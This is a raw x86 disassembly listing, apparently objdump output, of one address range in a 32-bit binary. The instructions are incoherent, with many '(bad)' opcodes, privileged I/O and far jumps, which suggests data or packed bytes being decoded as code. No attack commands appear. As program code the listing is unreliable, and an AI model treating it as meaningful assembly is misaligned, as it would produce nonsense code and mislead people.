  407c42:	stc    
  407c43:	popa   
  407c44:	fcmovu st,st(7)
  407c46:	and    ebx,DWORD PTR [eax-0x3e95bf61]
  407c4c:	xor    ebx,DWORD PTR [edx+0x35d49001]
  407c52:	cld    
  407c53:	ss cmp eax,0x6222e235
  407c59:	es in  eax,0x6e
  407c5c:	mov    ebp,0xe8345ff5
  407c61:	adc    cl,BYTE PTR [esi-0x6e]
  407c64:	les    esp,FWORD PTR [edi]
  407c66:	or     DWORD PTR [esi+0x567c631b],edx
  407c6c:	retf   0x2430
  407c6f:	push   esi
  407c70:	mov    ecx,0x93ceea96
  407c75:	popf   
  407c76:	xchg   ebx,eax
  407c77:	inc    ebx
  407c78:	ficom  DWORD PTR [ecx+esi*8-0x57342ae9]
  407c7f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407c81:	jmp    0x407cac
  407c83:	pop    ds
  407c84:	and    DWORD PTR [eax-0xd353f2b],ecx
  407c8a:	sub    ebp,DWORD PTR [ecx]
  407c8c:	add    dh,BYTE PTR [esi-0x6ab4de1]
  407c92:	ins    DWORD PTR es:[edi],dx
  407c93:	fcomp  DWORD PTR [ebp-0x57]
  407c96:	shr    DWORD PTR [ebp-0x37680839],cl
  407c9c:	loopne 0x407cf4
  407c9e:	mov    al,ds:0xfbf9926
  407ca3:	int    0x1c
  407ca5:	arpl   WORD PTR [eax-0x68],ax
  407ca8:	or     eax,0xbbfa4e00
  407cad:	icebp  
  407cae:	outs   dx,BYTE PTR ds:[esi]
  407caf:	pop    ecx
  407cb0:	jno    0x407c42
  407cb2:	(bad)  
  407cb3:	mov    esi,0xf016b380
  407cb8:	ins    DWORD PTR es:[edi],dx
  407cb9:	or     eax,0x3a8ffbb9
  407cbe:	shr    BYTE PTR [ebx+ebp*8-0x1cd69786],cl
  407cc5:	loope  0x407ca6
  407cc7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  407cc9:	dec    esi
  407cca:	mov    al,ds:0x552ac545
  407ccf:	mov    ebx,edx
  407cd1:	and    al,0xc2
  407cd3:	inc    ebp
  407cd4:	xchg   ecx,eax
  407cd5:	ds imul edx,edx,0xffffffde
  407cd9:	call   0xf0759c6
  407cde:	jmp    0x407d20
  407ce0:	jnp    0x407c86
  407ce2:	push   esp
  407ce3:	xor    esi,eax
  407ce5:	or     ebx,0xb98cb68b
  407ceb:	xchg   eax,edx
  407ced:	loope  0x407cbd
  407cef:	test   eax,0x3351580f
  407cf4:	adc    al,BYTE PTR [edi+eax*1+0x25]
  407cf8:	mov    dl,0x4c
  407cfa:	scas   al,BYTE PTR es:[edi]
  407cfb:	mov    edi,0x476d1d61
  407d00:	or     al,0x72
  407d02:	inc    edi
  407d03:	pusha  
  407d04:	pop    ebx
  407d05:	pusha  
  407d06:	mov    ds:0x33f20729,al
  407d0b:	sbb    DWORD PTR [esi+0x3679d8bd],ebp
  407d11:	and    esp,DWORD PTR [esi]
  407d13:	leave  
  407d14:	sbb    BYTE PTR [ecx+0x4c],ch
  407d17:	nop
  407d18:	ret    0x676c
  407d1b:	shl    DWORD PTR ds:0x66f83566,0x9e
  407d22:	pop    ds
  407d23:	push   edi
  407d24:	pop    esi
  407d25:	mov    bl,0xde
  407d27:	push   ecx
  407d28:	mov    esi,0x6d8fb0d7
  407d2d:	mov    ecx,0x32ce8c27
  407d32:	rcl    BYTE PTR [ebx],0x43
  407d35:	icebp  
  407d36:	lea    ebp,[ebp+0x40826921]
  407d3c:	dec    esp
  407d3d:	pop    es
  407d3e:	jno    0x407d59
  407d40:	aad    0x8
  407d42:	cmp    al,0x64
  407d44:	test   eax,0x89785032
  407d49:	lahf   
  407d4a:	rol    DWORD PTR [edx+0x13eac1a4],cl
  407d50:	div    DWORD PTR ds:0x1d8e3013
  407d56:	mov    eax,ds:0x872a1ee5
  407d5b:	into   
  407d5c:	shl    DWORD PTR [ecx],cl
  407d5e:	fcmovbe st,st(7)
  407d60:	pushf  
  407d61:	mov    al,ds:0xbb8dcd8e
  407d66:	sbb    al,0xe1
  407d68:	popf   
  407d69:	jp     0x407d11
  407d6b:	jmp    0x407de4
  407d6d:	int3   
  407d6e:	jmp    0x8b673ba8
  407d73:	mov    cl,0xaa
  407d75:	push   edi
  407d76:	pop    ebp
  407d77:	push   ebx
  407d78:	scas   al,BYTE PTR es:[edi]
  407d79:	and    DWORD PTR [ebp-0x22],ebp
  407d7c:	shr    al,1
  407d7e:	or     al,0x8f
  407d80:	out    0x1e,al
  407d82:	test   BYTE PTR [esi+0xa],cl
  407d85:	push   ds
  407d86:	icebp  
  407d87:	cmc    
  407d88:	aam    0x13
  407d8a:	lock in al,0x4e
  407d8d:	sbb    DWORD PTR [ebp-0x43],ebx
  407d90:	pop    edx
  407d91:	inc    ecx
  407d92:	mov    eax,ds:0x3b7d8e5b
  407d97:	int3   
  407d98:	rcl    eax,1
  407d9a:	mov    ds:0xa9894348,al
  407d9f:	call   0x337d:0xfeba70a7
  407da6:	xchg   ebx,eax
  407da7:	sbb    BYTE PTR ds:0xa086b875,ah
  407dad:	leave  
  407dae:	mov    DWORD PTR [ebx+0x27c0b133],ebp
  407db4:	push   edx
  407db5:	popf   
  407db6:	cld    
  407db7:	push   edi
  407db8:	outs   dx,DWORD PTR ds:[esi]
  407db9:	ret    
  407dba:	aam    0xbd
  407dbc:	cmp    dh,BYTE PTR [edi]
  407dbe:	icebp  
  407dbf:	mov    edi,0x56823549
  407dc4:	dec    ebp
  407dc5:	or     edx,edi
  407dc7:	or     ebp,ebx
  407dc9:	lahf   
  407dca:	icebp  
  407dcb:	xor    dl,BYTE PTR [esp+ebp*2]
  407dce:	fcmovnb st,st(2)
  407dd0:	xor    eax,0xb9da52c1
  407dd5:	jns    0x407db6
  407dd7:	adc    eax,0x2d12cec9
  407ddc:	les    ecx,FWORD PTR [ebx]
  407dde:	stos   DWORD PTR es:[edi],eax
  407ddf:	xchg   esp,eax
  407de0:	adc    DWORD PTR gs:[edi],esp
  407de3:	out    0xe8,eax
  407de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407de6:	xor    eax,0x9ae564cf
  407deb:	call   0x3a86db38
  407df0:	lock fs retf 
  407df3:	jp     0x407dd2
  407df5:	int3   
  407df6:	sti    
  407df7:	push   ecx
  407df8:	bound  ecx,QWORD PTR [eax-0x71]
  407dfb:	sbb    al,0x20
  407dfd:	xchg   ebx,eax
  407dfe:	inc    eax
  407dff:	aas    
  407e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e01:	add    edi,DWORD PTR [ebx+0x37]
  407e04:	or     edx,DWORD PTR [ebp-0xf]
  407e07:	push   ds
  407e08:	stos   DWORD PTR es:[edi],eax
  407e09:	pop    esp
  407e0a:	sub    BYTE PTR [ecx+0x36],bh
  407e0d:	cmp    esp,ebp
  407e0f:	add    bh,BYTE PTR [ecx]
  407e11:	sub    BYTE PTR [eax],ah
  407e13:	or     al,0xc1
  407e15:	in     al,0x6d
  407e17:	jl     0x407dd7
  407e19:	loop   0x407dfe
  407e1b:	cdq    
  407e1c:	shl    ecx,1
  407e1e:	xor    BYTE PTR [edi+0x57632227],ah
  407e24:	ret    
  407e25:	mov    edi,DWORD PTR [ebp+edi*2-0xb]
  407e29:	jo     0x407e20
  407e2b:	or     BYTE PTR [ecx-0x50],0xdf
  407e2f:	mov    al,0x75
  407e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e32:	pop    edi
  407e33:	dec    esp
  407e34:	pcmpgtw mm7,QWORD PTR [ecx-0x19d544a7]
  407e3b:	inc    edi
  407e3c:	xchg   esi,eax
  407e3d:	add    eax,0x6a3b1509
  407e42:	mov    dh,0x6f
  407e44:	dec    ecx
  407e45:	sub    DWORD PTR [esp+edi*2],ebx
  407e48:	mov    BYTE PTR [esi+0x3f056709],al
  407e4e:	xchg   esi,eax
  407e4f:	inc    esi
  407e50:	sub    ch,dh
  407e52:	and    ecx,DWORD PTR [ebx+0x54]
  407e55:	mov    esi,0xd0d39b58
  407e5a:	add    esp,eax
  407e5c:	add    al,ch
  407e5e:	lods   al,BYTE PTR ds:[esi]
  407e5f:	(bad)  
  407e60:	into   
  407e61:	xlat   BYTE PTR ds:[ebx]
  407e62:	mov    ch,0x62
  407e64:	popa   
  407e65:	outs   dx,DWORD PTR ds:[esi]
  407e66:	dec    ebx
  407e67:	rcl    BYTE PTR [bx+0x48],1
  407e6b:	adc    eax,DWORD PTR [ebx+0x20b13631]
  407e71:	iret   
  407e72:	nop    DWORD PTR [bx+si+0x5a]
  407e77:	cmc    
  407e78:	cmp    al,bl
  407e7a:	fcmovne st,st(7)
  407e7c:	mov    ch,0x6
  407e7e:	pop    es
  407e7f:	fldcw  WORD PTR [ebx]
  407e81:	sbb    DWORD PTR [edx],ebx
  407e83:	push   edx
  407e84:	mov    ch,0x7d
  407e86:	ds pop ds
  407e88:	push   ss
  407e89:	push   esi
  407e8a:	jmp    DWORD PTR [ebx+0xc4cf7dc]
  407e90:	add    bh,BYTE PTR [ecx+0x517b1bde]
  407e96:	mov    WORD PTR [esi-0x593bda94],gs
  407e9c:	call   0x4e8e:0x9d29ea01
  407ea3:	mov    dh,0xfe
  407ea5:	sbb    BYTE PTR fs:[eax+0x3a],ch
  407ea9:	int    0x92
  407eab:	(bad)  
  407eac:	xchg   edi,eax
  407ead:	mov    ecx,DWORD PTR [edx+0x74e83dad]
  407eb3:	mov    DWORD PTR [esi-0x6d],eax
  407eb6:	out    dx,eax
  407eb7:	arpl   WORD PTR [eax],cx
  407eb9:	push   ss
  407eba:	ss out dx,eax
  407ebc:	(bad)  
  407ebd:	lock dec esp
  407ebf:	sbb    eax,0x26759a9e
  407ec4:	ins    DWORD PTR es:[edi],dx
  407ec5:	mov    ecx,0x3cb48052
  407eca:	call   edx
  407ecc:	or     dh,BYTE PTR [eax-0x55]
  407ecf:	hlt    
  407ed0:	and    al,0x12
  407ed2:	ins    DWORD PTR es:[edi],dx
  407ed3:	adc    BYTE PTR [edx+edi*1-0x7a],ah
  407ed7:	push   0xffffffc2
  407ed9:	mov    ds,WORD PTR [ebx-0x12]
  407edc:	js     0x407f4f
  407ede:	xor    BYTE PTR [edx],bl
  407ee0:	adc    ah,BYTE PTR [edx-0x5b844f5c]
  407ee6:	in     al,dx
  407ee7:	mov    WORD PTR [eax-0x47],gs
  407eea:	inc    edi
  407eeb:	and    ebx,DWORD PTR [esi+0x2348b4c1]
  407ef1:	jnp    0x407ece
  407ef3:	xchg   edx,eax
  407ef4:	out    0xfa,al
  407ef6:	adc    BYTE PTR [ecx+edi*2+0x16d83964],dh
  407efd:	xor    BYTE PTR [esi+eiz*1-0x6f],0xa
  407f02:	rcr    edi,cl
  407f04:	mov    ebp,0x1855f9bc
  407f09:	sar    DWORD PTR [esi],1
  407f0b:	cwde   
  407f0c:	xor    DWORD PTR [edi+0x7d],edi
  407f0f:	pop    ebx
  407f10:	adc    ch,dl
  407f12:	sahf   
  407f13:	cli    
  407f14:	out    dx,eax
  407f15:	and    BYTE PTR [eax+ecx*1],bl
  407f18:	xchg   edx,eax
  407f19:	xor    BYTE PTR [ebp-0x30],cl
  407f1c:	inc    ebx
  407f1d:	int3   
  407f1e:	and    edx,DWORD PTR [ebx-0x5bf3cc68]
  407f24:	mov    al,ds:0x4843ecce
  407f29:	or     eax,0xfef81cf1
  407f2e:	aad    0xf0
  407f30:	pop    edx
  407f31:	push   esp
  407f32:	dec    ebx
  407f33:	popa   
  407f34:	or     ch,0x8e
  407f37:	sub    dh,dh
  407f39:	sbb    al,0x9a
  407f3b:	rcl    BYTE PTR [ebx-0x7c],0xde
  407f3f:	xor    al,0xed
  407f41:	push   esi
  407f42:	ret    0x662b
  407f45:	retf   
  407f46:	in     eax,0x77
  407f48:	js     0x407f09
  407f4a:	neg    eax
  407f4c:	pop    edx
  407f4d:	ds cmp ecx,edi
  407f50:	ins    DWORD PTR es:[edi],dx
  407f51:	mov    dl,0xf3
  407f53:	(bad)  
  407f54:	xchg   ecx,eax
  407f55:	dec    edi
  407f56:	pushf  
  407f57:	pop    ecx
  407f58:	add    al,0x74
  407f5a:	(bad)  
  407f5b:	out    0xeb,al
  407f5d:	(bad)  
  407f5f:	test   eax,0x42e193d
  407f64:	int    0x8b
  407f66:	mov    ebx,DWORD PTR [edx-0x53]
  407f69:	jp     0x407fc2
  407f6b:	call   0x6bcb:0xe9d290fe
  407f72:	xor    al,0x5e
  407f74:	add    ah,al
  407f76:	jnp    0x407fc3
  407f78:	ins    DWORD PTR es:[edi],dx
  407f79:	lea    ecx,[edi+ebx*8+0x2c32b836]
  407f80:	aam    0xcd
  407f82:	push   DWORD PTR [ecx-0x5b303fc4]
  407f88:	and    DWORD PTR ds:0xfd661d65,0xffffffdd
  407f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f90:	pop    eax
  407f91:	jmp    0x407f22
  407f93:	shl    BYTE PTR [ebp+0x376088d8],1
  407f99:	pusha  
  407f9a:	push   0xfffffff1
  407f9c:	add    cl,BYTE PTR [edi]
  407f9e:	test   DWORD PTR [eax+0x77],edx
  407fa1:	pop    eax
  407fa2:	ja     0x407f54
  407fa4:	test   BYTE PTR [edx-0x5c],al
  407fa7:	into   
  407fa8:	(bad)  
  407fa9:	sbb    BYTE PTR [ecx-0x77324142],ah
  407faf:	jae    0x40802f
  407fb1:	jnp    0x407fa0
  407fb3:	sub    BYTE PTR [edx+0x48f25f9d],0x20
  407fba:	(bad)  
  407fbb:	inc    BYTE PTR [edi+esi*2-0x1]
  407fbf:	jno    0x40803d
  407fc1:	mov    dh,0xa5
  407fc3:	pop    ss
  407fc4:	xchg   ebp,eax
  407fc5:	mov    WORD PTR [ebp-0x19775602],ds
  407fcb:	mov    ebp,ecx
  407fcd:	dec    eax
  407fce:	jbe    0x407f54
  407fd0:	cmp    eax,DWORD PTR [esi]
  407fd2:	pop    ds
  407fd3:	loopne 0x407f66
  407fd5:	sbb    al,0xc5
  407fd7:	out    dx,al
  407fd8:	jo     0x407f6a
  407fda:	inc    esp
  407fdb:	ror    BYTE PTR [bp+di],1
  407fde:	or     DWORD PTR [ebp-0x2f],ebp
  407fe1:	cli    
  407fe2:	outs   dx,BYTE PTR ds:[esi]
  407fe3:	pop    ebp
  407fe4:	mov    ds,WORD PTR [edx+0x5cf34ad1]
  407fea:	or     cl,BYTE PTR [edx]
  407fec:	add    esp,ecx
  407fee:	jno    0x40803e
  407ff0:	dec    edx
  407ff1:	les    esp,FWORD PTR [eax]
  407ff3:	js     0x408055
  407ff5:	cmp    al,0x5e
  407ff7:	and    BYTE PTR [ebx-0x3e71edbd],dl
  407ffd:	inc    ecx
  407ffe:	push   edi
  407fff:	sub    BYTE PTR [edi+0x6e],dh
  408002:	and    DWORD PTR [eax-0x21],ecx
  408005:	das    
  408006:	lds    ecx,FWORD PTR [edx+0x18]
  408009:	in     eax,dx
  40800a:	dec    ebx
  40800b:	add    al,0xa1
  40800d:	adc    DWORD PTR [ebx],ebx
  40800f:	sbb    BYTE PTR [ecx+0x3bd29b1d],dh
  408015:	jmp    0xec8abb56
  40801a:	mov    eax,0x17bdf30e
  40801f:	(bad)  
  408020:	mov    fs,WORD PTR [edi+eiz*8+0x4069bce9]
  408027:	mov    dh,0xbb
  408029:	xor    esp,DWORD PTR [ecx+0x14]
  40802c:	sub    edi,ecx
  40802e:	or     ebp,DWORD PTR [edx-0x1971f366]
  408034:	fnstenv [eax+0x5]
  408037:	rcr    BYTE PTR [edx-0x15],cl
  40803a:	mov    dh,0xa3
  40803c:	jb     0x408011
  40803e:	imul   eax,DWORD PTR [ebx-0x4d],0xffffffd8
  408042:	cmp    ecx,DWORD PTR [ecx+0x3f972634]
  408048:	fs cli 
  40804a:	mov    ebp,0xce37cf85
  40804f:	inc    esp
  408050:	mov    bh,0xe8
  408052:	or     dh,BYTE PTR [esi-0x78]
  408055:	jmp    0x7cb2:0x6c52833b
  40805c:	test   al,0x40
  40805e:	add    DWORD PTR [edx-0xe595ab3],0xa3b0b2c3
  408068:	sbb    DWORD PTR [esi+0x8b95785],ecx
  40806e:	mov    esi,0xf69d176d
  408073:	sbb    eax,edi
  408075:	cmp    esi,eax
  408077:	push   es
  408078:	jl     0x408019
  40807a:	mov    eax,0xa9c50dc6
  40807f:	push   eax
  408080:	popa   
  408081:	push   esp
  408082:	sti    
  408083:	jbe    0x408051
  408085:	(bad)  
  408086:	cwde   
  408087:	sbb    eax,0xf22c8036
  40808c:	mov    sp,0x6243
  408090:	pop    eax
  408091:	and    al,0xf4
  408093:	in     al,0xb5
  408095:	lods   al,BYTE PTR ds:[esi]
  408096:	enter  0xca49,0xfe
  40809a:	fwait
  40809b:	outs   dx,DWORD PTR ds:[esi]
  40809c:	adc    cl,BYTE PTR [ecx-0x21be80b6]
  4080a2:	jle    0x40808d
  4080a4:	cmp    al,BYTE PTR [eax+0x3578d408]
  4080aa:	sbb    eax,0x6e6c8bcc
  4080af:	cdq    
  4080b0:	push   ss
  4080b1:	sbb    eax,0xe05890f7
  4080b6:	xchg   DWORD PTR [esp+eax*8],esp
  4080b9:	xor    DWORD PTR [ebx],ecx
  4080bb:	pop    ebx
  4080bc:	lock std 
  4080be:	or     ebp,ecx
  4080c0:	dec    edx
  4080c1:	inc    esp
  4080c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080c3:	sub    DWORD PTR [ecx],ecx
  4080c5:	adc    eax,0xb6f39e43
  4080ca:	jmp    0x5d28:0xc55f2339
  4080d1:	hlt    
  4080d2:	aas    
  4080d3:	out    0x21,eax
  4080d5:	xor    eax,0x6882029
  4080da:	lahf   
  4080db:	lods   al,BYTE PTR ds:[esi]
  4080dc:	jne    0x88090ae3
  4080e2:	ss aaa 
  4080e4:	int3   
  4080e5:	jnp    0x408109
  4080e7:	xor    BYTE PTR [esi+0x2a],cl
  4080ea:	lea    ecx,[ebx+0xb]
  4080ed:	clc    
  4080ee:	lods   al,BYTE PTR ds:[esi]
  4080ef:	pop    edx
  4080f0:	cli    
  4080f1:	cmp    al,0xf
  4080f3:	add    eax,0x43427cd4
  4080f8:	xor    al,0xa
  4080fa:	and    esi,ecx
  4080fc:	in     eax,dx
  4080fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080fe:	xchg   ebx,eax
  4080ff:	out    0xff,eax
  408101:	pusha  
  408102:	push   es
  408103:	and    al,0x5
  408105:	mov    bx,0xee9c
  408109:	xchg   esp,eax
  40810a:	dec    esp
  40810b:	mov    ch,0xbf
  40810d:	fnsave [esi+0x67]
  408110:	cmp    al,0x52
  408112:	mov    bl,cl
  408114:	and    BYTE PTR [esi+0xa],cl
  408117:	in     al,dx
  408118:	inc    ebp
  408119:	mov    DWORD PTR [esi],ebp
  40811b:	mov    esi,eax
  40811d:	(bad)  
  40811e:	cmp    BYTE PTR [eax-0x79d3c4cb],al
  408124:	jmp    FWORD PTR [esi+0x3c23fd47]
  40812a:	dec    ecx
  40812b:	sub    eax,0x69df9a42
  408130:	mov    ds:0xda199238,al
  408135:	pop    edx
  408136:	lods   eax,DWORD PTR ds:[esi]
  408138:	add    ebx,eax
  40813a:	jns    0x40819f
  40813c:	ret    
  40813d:	mov    bl,0xa0
  40813f:	mov    edi,0x877136a5
  408144:	ins    BYTE PTR es:[edi],dx
  408145:	push   cs
  408146:	push   ebx
  408147:	adc    DWORD PTR [ecx-0x6108da93],ebx
  40814d:	or     BYTE PTR [edx-0x706ac033],dh
  408153:	pop    esp
  408154:	xchg   esi,eax
  408155:	mov    ebp,0xe501ef1b
  40815a:	pop    eax
  40815b:	or     eax,edx
  40815d:	mov    esp,0xd835cb43
  408162:	pop    ecx
  408163:	mov    DWORD PTR es:[ebp+0x49],0x749f6735
  40816b:	stos   DWORD PTR es:[edi],eax
  40816c:	sub    BYTE PTR [edi],al
  40816e:	cmp    eax,0x10f49c6a
  408173:	xor    BYTE PTR [edi-0x77],dl
  408176:	jno    0x4080fa
  408178:	and    al,0xbd
  40817a:	mov    edi,0xae7fe75c
  40817f:	inc    edx
  408180:	and    BYTE PTR [eax-0x631567a3],0x13
  408187:	aad    0xcd
  408189:	sbb    DWORD PTR [ecx+eiz*1+0x4c],0x9f68b822
  408191:	xchg   edx,eax
  408192:	cmp    al,0x0
  408194:	add    DWORD PTR [esi],esp
  408196:	lods   al,BYTE PTR ds:[esi]
  408197:	push   esp
  408198:	call   0x4fbf:0x7a8b1f75
  40819f:	push   ecx
  4081a0:	in     eax,0x4a
  4081a2:	inc    ecx
  4081a3:	hlt    
  4081a4:	or     BYTE PTR [edx-0x108bfde9],bl
  4081aa:	addr16 std 
  4081ac:	dec    ebx
  4081ad:	jno    0x40817b
  4081af:	inc    esp
  4081b0:	dec    eax
  4081b1:	enter  0xa8cd,0x8
  4081b5:	test   BYTE PTR ds:0xaa75bfc0,dl
  4081bb:	inc    ebx
  4081bc:	cmp    al,0x81
  4081be:	pop    ss
  4081bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081c0:	ins    DWORD PTR es:[edi],dx
  4081c1:	mov    esi,0xc87a5aae
  4081c6:	loope  0x408151
  4081c8:	add    DWORD PTR [eax-0x532c1b9e],esp
  4081ce:	pmaxsw mm0,QWORD PTR [esi]
  4081d1:	mov    BYTE PTR [esi+0x1d],bl
  4081d4:	je     0x408194
  4081d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d7:	cli    
  4081d8:	mov    al,0xc
  4081da:	cmp    al,0x43
  4081dc:	dec    ebx
  4081dd:	jno    0x40817f
  4081df:	push   ebx
  4081e0:	jae    0x4081c0
  4081e2:	fs (bad) 
  4081e4:	leave  
  4081e5:	push   es
  4081e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081e7:	aam    0x59
  4081e9:	cmp    eax,0x3e08a130
  4081ee:	sahf   
  4081ef:	xorps  xmm5,XMMWORD PTR [edx+eax*8+0x68]
  4081f4:	or     eax,0x5948f97
  4081f9:	(bad)  
  4081fb:	mov    al,BYTE PTR [ecx]
  4081fd:	mov    eax,0x70b9da10
  408202:	mov    bh,0xa7
  408204:	ins    BYTE PTR es:[edi],dx
  408205:	mov    ebx,0x42768f99
  40820a:	ret    
  40820b:	call   0xd8b152eb
  408210:	push   ebp
  408211:	jge    0x4081f0
  408213:	sbb    BYTE PTR [edi+esi*8+0x367d8ae2],dl
  40821a:	std    
  40821b:	retf   
  40821c:	cmp    bl,BYTE PTR es:[eax+0x67]
  408220:	xor    esp,DWORD PTR [ecx+ebx*8-0xd]
  408224:	push   ebp
  408225:	retf   0x6453
  408228:	add    DWORD PTR [eax+ebp*2-0x68],edi
  40822c:	ds pop ebp
  40822e:	loope  0x4081f1
  408230:	sub    esp,DWORD PTR [esi-0x28e492b5]
  408236:	fcom   DWORD PTR ss:[edi+0x11b4d212]
  40823d:	cmp    BYTE PTR [ebx+0x3711147d],cl
  408243:	(bad)  
  408244:	ds jnp 0x408249
  408247:	push   edx
  408248:	cli    
  408249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40824a:	test   ah,cl
  40824c:	fisubr WORD PTR [ebp+0x1a]
  40824f:	aam    0xde
  408251:	inc    ecx
  408252:	sbb    ecx,ecx
  408254:	in     eax,0x9b
  408256:	repnz push 0x5e
  408259:	ins    BYTE PTR es:[edi],dx
  40825a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40825b:	int3   
  40825c:	call   0xe554:0xa34e3fac
  408263:	push   esi
  408264:	jns    0x408273
  408266:	inc    ebp
  408267:	sbb    BYTE PTR [ebx-0x42],0x1f
  40826b:	enter  0x3462,0x7c
  40826f:	push   esp
  408270:	out    0x3f,al
  408272:	bound  eax,QWORD PTR [edx-0x65]
  408275:	int    0x15
  408277:	ins    BYTE PTR es:[edi],dx
  408278:	nop
  408279:	pusha  
  40827a:	arpl   WORD PTR [edx],si
  40827c:	ins    DWORD PTR es:[edi],dx
  40827d:	or     cl,BYTE PTR [eax+ecx*8+0x75]
  408281:	pop    es
  408282:	out    dx,al
  408283:	pop    eax
  408284:	mov    WORD PTR [eax],es
  408286:	sub    DWORD PTR [eax-0x64],edx
  408289:	fistp  DWORD PTR [esi]
  40828b:	hlt    
  40828c:	push   edi
  40828d:	(bad)  
  40828e:	fucomip st,st(2)
  408290:	or     al,cl
  408292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408293:	dec    edx
  408294:	mov    al,0x53
  408296:	mov    ah,bl
  408298:	out    dx,al
  408299:	xor    ah,BYTE PTR [eax-0x64fd7645]
  40829f:	inc    eax
  4082a0:	sbb    esp,DWORD PTR ds:0x66c7c11f
  4082a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082a8:	cmp    bh,0x82
  4082ab:	lds    ebx,FWORD PTR [ebx]
  4082ad:	imul   DWORD PTR [ecx-0x7e66d59c]
  4082b3:	test   DWORD PTR [ebp+0xe],ebp
  4082b6:	ret    0x57e2
  4082b9:	push   ebp
  4082ba:	jo     0x408244
  4082bc:	sub    al,0xd8
  4082be:	fisubr WORD PTR [ecx]
  4082c0:	repz mov ebp,0x30c77784
  4082c6:	retf   
  4082c7:	fsubr  st(4),st
  4082c9:	inc    esp
  4082ca:	imul   eax,DWORD PTR [ecx+0x53ea822d],0x8f165d9b
  4082d4:	cmp    dl,BYTE PTR [eax]
  4082d6:	push   cs
  4082d7:	fs inc eax
  4082d9:	mov    edi,gs
  4082db:	mov    ebp,0xed08fdc3
  4082e0:	mov    edi,0xb169e338
  4082e5:	sbb    eax,0x2bfb4901
  4082ea:	push   edi
  4082eb:	jns    0x4082f7
  4082ed:	clc    
  4082ee:	int3   
  4082ef:	mov    ah,0x92
  4082f1:	in     al,0x86
  4082f3:	xchg   ebp,eax
  4082f4:	or     eax,0x721215fa
  4082f9:	push   es
  4082fa:	pop    edx
  4082fb:	jg     0x4082dd
  4082fd:	xor    al,0x26
  4082ff:	pop    es
  408300:	jmp    0x408350
  408302:	lods   al,BYTE PTR ds:[esi]
  408303:	xor    bl,ah
  408305:	mov    ds:0xb3c0949a,eax
  40830b:	push   edx
  40830c:	imul   ecx,DWORD PTR [edi+0x35],0xe47fa94a
  408313:	jmp    0x408392
  408315:	cld    
  408316:	add    edx,DWORD PTR [edx]
  408318:	jg     0x408396
  40831a:	push   edx
  40831b:	out    dx,eax
  40831c:	(bad)  
  40831d:	hlt    
  40831e:	jne    0x4082c5
  408320:	cwde   
  408321:	and    bh,bh
  408323:	dec    esi
  408324:	enter  0xc00c,0xe0
  408328:	mov    WORD PTR [esi-0x68d1490b],?
  40832e:	or     cl,BYTE PTR fs:[ecx]
  408331:	mov    edx,0x22cd7557
  408336:	sbb    DWORD PTR [edi],ecx
  408338:	pop    ecx
  408339:	mov    BYTE PTR [ebx-0x425058b7],dh
  40833f:	lea    eax,[esp+esi*8]
  408342:	jmp    0x394e:0xfa59b6a3
  408349:	call   0x6ee00c98
  40834e:	xor    dh,dh
  408350:	cmp    DWORD PTR [bx+si-0xc],esp
  408354:	fs jbe 0x40837b
  408357:	das    
  408358:	mov    cl,0x2a
  40835a:	shl    DWORD PTR [esi+0x3b],1
  40835d:	std    
  40835e:	(bad)  [ebx+0x6e0eadfc]
  408364:	jmp    0x3cc05344
  408369:	(bad)  
  40836a:	cld    
  40836b:	test   ecx,0xd788b8c
  408371:	inc    eax
  408372:	mov    ecx,0xc31d316d
  408377:	mov    edi,0xd6bab2af
  40837c:	push   ds
  40837d:	cs push eax
  40837f:	rol    BYTE PTR [esp+eax*4-0x399e5115],0xa2
  408387:	dec    edx
  408388:	loopne 0x40834b
  40838a:	pushf  
  40838b:	pop    ebp
  40838c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40838d:	outs   dx,BYTE PTR ds:[esi]
  40838e:	dec    esp
  40838f:	shl    bl,cl
  408391:	aaa    
  408392:	cmp    edx,DWORD PTR [edx-0x4e]
  408395:	adc    al,0x45
  408397:	jg     0x40838a
  408399:	fcomp  QWORD PTR [esi-0x391b80a7]
  40839f:	(bad)  
  4083a0:	ror    BYTE PTR [edx],1
  4083a2:	inc    eax
  4083a3:	adc    al,0xb9
  4083a5:	hlt    
  4083a6:	iret   
  4083a7:	sbb    cl,BYTE PTR [esp+edi*2]
  4083aa:	cs hlt 
  4083ac:	jmp    0xa7d5c5cb
  4083b1:	(bad)  
  4083b2:	xchg   edi,eax
  4083b3:	adc    bl,BYTE PTR [ebx+0x1a8986be]
  4083b9:	addr16 cmp al,bl
  4083bc:	jmp    0xbb14:0x2cb84c2
  4083c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083c4:	mov    ds:0x178259b2,eax
  4083c9:	(bad)  
  4083ca:	jo     0x408440
  4083cc:	hlt    
  4083cd:	xchg   esi,eax
  4083ce:	lods   al,BYTE PTR ds:[esi]
  4083cf:	mov    ah,0xfc
  4083d1:	mov    dl,0x98
  4083d3:	js     0x408420
  4083d5:	jmp    0xf1a119ec
  4083da:	daa    
  4083db:	adc    eax,0x3ec2752d
  4083e0:	out    dx,eax
  4083e1:	mov    esp,DWORD PTR [ebp+0x49ff6567]
  4083e7:	inc    eax
  4083e8:	mov    ah,0x7f
  4083ea:	pop    ebx
  4083eb:	and    al,0xfd
  4083ed:	mov    ch,0xfe
  4083ef:	ret    
  4083f0:	mov    ecx,ebx
  4083f2:	in     al,0x3b
  4083f4:	cmp    BYTE PTR [ecx-0x1f],al
  4083f7:	aas    
  4083f8:	jge    0x40845d
  4083fa:	iret   
  4083fb:	dec    ecx
